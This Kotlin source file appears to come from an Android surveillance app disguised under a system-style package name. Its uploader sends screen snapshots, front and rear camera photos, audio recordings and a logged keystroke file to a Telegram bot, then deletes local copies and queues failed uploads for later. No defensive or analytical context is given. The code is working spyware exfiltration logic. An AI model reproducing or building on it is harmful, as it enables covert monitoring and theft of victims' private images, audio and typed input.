package com.system.superiormonitor.bot

import android.content.Context
import android.content.Intent
import com.system.superiormonitor.core.LogCategory
import com.system.superiormonitor.core.LogLevel
import com.system.superiormonitor.core.LogManager
import com.system.superiormonitor.data.PrefsManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

object MediaUploader {

    suspend fun uploadDocument(
        context: Context,
        token: String,
        chatId: String,
        file: File,
        mimeType: String = "text/plain",
        caption: String? = null,
        fallbackOfflineSubdir: String? = null,
        deleteOnSuccess: Boolean = true
    ): Boolean {
        if (!file.exists()) return false

        val success = TelegramApi.sendDocument(
            botToken = token,
            chatId = chatId,
            context = context,
            uri = android.net.Uri.fromFile(file),
            mimeType = mimeType,
            fileName = file.name,
            caption = caption ?: ""
        ) != null

        if (success) {
            if (deleteOnSuccess) file.delete()
            LogManager.log(LogCategory.BOT_ACTIVITY, "Successfully uploaded document: ${file.name}")
            return true
        } else {
            LogManager.log(LogCategory.BOT_ACTIVITY, "Failed to upload document: ${file.name}", LogLevel.ERROR)
            if (fallbackOfflineSubdir != null) {
                moveToOfflineQueue(context, file, fallbackOfflineSubdir)
            }
            return false
        }
    }

    suspend fun uploadDocumentUri(
        context: Context,
        token: String,
        chatId: String,
        uri: android.net.Uri,
        mimeType: String,
        fileName: String,
        caption: String? = null
    ): Boolean {
        val success = TelegramApi.sendDocument(
            botToken = token,
            chatId = chatId,
            context = context,
            uri = uri,
            mimeType = mimeType,
            fileName = fileName,
            caption = caption ?: ""
        ) != null
        if (success) {
            LogManager.log(LogCategory.BOT_ACTIVITY, "Successfully uploaded URI document: $fileName")
        } else {
            LogManager.log(LogCategory.BOT_ACTIVITY, "Failed to upload URI document: $fileName", LogLevel.ERROR)
        }
        return success
    }

    suspend fun uploadPhoto(
        context: Context,
        token: String,
        chatId: String,
        file: File,
        caption: String? = null,
        fallbackOfflineSubdir: String? = null,
        deleteOnSuccess: Boolean = true
    ): Boolean {
        if (!file.exists()) return false

        val success = TelegramApi.sendPhoto(token, chatId, file, caption)

        if (success) {
            if (deleteOnSuccess) file.delete()
            LogManager.log(LogCategory.BOT_ACTIVITY, "Successfully uploaded photo: ${file.name}")
            return true
        } else {
            LogManager.log(LogCategory.BOT_ACTIVITY, "Failed to upload photo: ${file.name}", LogLevel.ERROR)
            if (fallbackOfflineSubdir != null) {
                moveToOfflineQueue(context, file, fallbackOfflineSubdir)
            }
            return false
        }
    }

    private fun moveToOfflineQueue(context: Context, file: File, subdir: String) {
        try {
            val dateFolderFormatter = java.text.SimpleDateFormat("dd-MM-yyyy", java.util.Locale.US)
            val dateFolderName = dateFolderFormatter.format(java.util.Date())
            val offlineDir = File(context.getExternalFilesDir(null), "$subdir/$dateFolderName/offline")
            if (!offlineDir.exists()) offlineDir.mkdirs()
            val offlineFile = File(offlineDir, file.name)
            file.renameTo(offlineFile)
            LogManager.log(LogCategory.BOT_ACTIVITY, "Moved ${file.name} to offline queue: $subdir")
        } catch (e: Exception) {
            LogManager.log(LogCategory.BOT_ACTIVITY, "Failed to move ${file.name} to offline queue: ${e.message}", LogLevel.ERROR)
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  LEGACY INTENT HANDLERS (Used by BotService and SnapshotScheduler)
    // ═══════════════════════════════════════════════════════════

    fun handleUploadSnapshot(context: Context, intent: Intent, serviceScope: CoroutineScope, prefsManager: PrefsManager) {
        val filePath = intent.getStringExtra("filePath") ?: return
        val tag = intent.getStringExtra("tag") ?: "[SnapshotWorker]"
        val isSnapshot = intent.getBooleanExtra("isSnapshot", true)

        serviceScope.launch(Dispatchers.IO) {
            val file = File(filePath)
            val token = prefsManager.botToken
            val chatId = prefsManager.chatId
            if (token.isBlank() || chatId.isBlank()) return@launch

            val messageText = if (isSnapshot) {
                BotMessages.MediaOps.buildSnapshotUploadMessage()
            } else {
                BotMessages.MediaOps.buildCameraUploadMessage(tag)
            }
            TelegramApi.sendMessage(token, chatId, messageText)
            delay(3000)

            val fallbackDir = if (isSnapshot) "captures/screen" else if (tag.contains("Front")) "captures/front" else "captures/rear"
            uploadPhoto(
                context = context,
                token = token,
                chatId = chatId,
                file = file,
                fallbackOfflineSubdir = fallbackDir
            )
        }
    }

    fun handleUploadRecording(context: Context, intent: Intent, prefsManager: PrefsManager) {
        val fileUriString = intent.getStringExtra("fileUri") ?: return
        val originalPath = intent.getStringArrayExtra("originalPath") ?: emptyArray()
        val mimeType = intent.getStringExtra("mimeType") ?: "audio/mpeg"
        
        CoroutineScope(Dispatchers.IO).launch {
            val fileUri = android.net.Uri.parse(fileUriString)
            
            var originalFileName = originalPath.lastOrNull() ?: "recording.opus"
            val extension = android.webkit.MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType)
            if (extension != null && !originalFileName.endsWith(".$extension")) {
                originalFileName = "$originalFileName.$extension"
            }
            
            val caption = BotMessages.MediaOps.buildNewRecordingUploadedMessage(originalFileName)
            
            if (TelegramApi.isApiReachable(context, prefsManager.botToken)) {
                val success = uploadDocumentUri(
                    context = context,
                    token = prefsManager.botToken,
                    chatId = prefsManager.chatId,
                    uri = fileUri,
                    mimeType = mimeType,
                    fileName = originalFileName,
                    caption = caption
                )
                if (success) {
                    OfflineManager.moveRecordingToPermanent(context, fileUriString, originalPath, mimeType)
                }
            } else {
                LogManager.log(LogCategory.BASIC_UPDATE, "Telegram unreachable. Left in offline for later sync.")
            }
        }
    }

    fun handleUploadKeyEvents(context: Context, serviceScope: CoroutineScope, prefsManager: PrefsManager) {
        serviceScope.launch(Dispatchers.IO) {
            val token = prefsManager.botToken
            val chatId = prefsManager.chatId
            if (token.isBlank() || chatId.isBlank()) return@launch
            
            if (!TelegramApi.isApiReachable(context, token)) return@launch 
            
            val file = File(context.getExternalFilesDir(null), "keyevents/offline/offline_keyevents.txt")
            if (file.exists() && file.length() > 0) {
                val caption = BotMessages.FetchOps.buildRoutineKeyEventsCaption()
                uploadDocument(
                    context = context,
                    token = token,
                    chatId = chatId,
                    file = file,
                    mimeType = "text/plain",
                    caption = caption,
                    fallbackOfflineSubdir = null
                )
            }
        }
    }
}
